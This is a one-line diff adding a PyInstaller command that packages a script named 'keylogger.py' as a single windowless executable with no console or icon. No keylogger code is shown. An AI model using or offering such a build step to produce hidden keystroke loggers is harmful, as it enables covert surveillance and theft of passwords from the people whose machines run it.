@@ -1,0 +1,1 @@
+pyinstaller -F -w --noconsole --clean --onefile --windowed -i "NONE" keylogger.py
